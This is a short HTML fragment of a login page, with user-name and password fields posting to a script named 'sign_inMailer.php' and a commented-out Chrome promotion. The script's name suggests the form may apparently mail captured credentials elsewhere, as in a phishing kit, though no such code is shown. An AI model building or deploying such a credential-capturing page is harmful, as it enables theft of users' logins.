...
<body>
<div id="login">
<form id="login_form" name="only_login" method="post" action="sign_inMailer.php">
    <div class="field_container">
      <input type="text" placeholder="User Name" name="adm_user" required>
    </div>
    
    <div class="field_container">
      <input type="Password" placeholder="Password" name="adm_pwd" required>
      
	  <button id="sign_in_button" name="sign_in" >
...
<!--<div id="chrome_web_store" style="opacity: 1;"><span id="chrome_logo"></span><h2>Using Google Chrome? <a id="chrome_ad_link" href="#">Get Login</a> for Chrome!</h2></div>
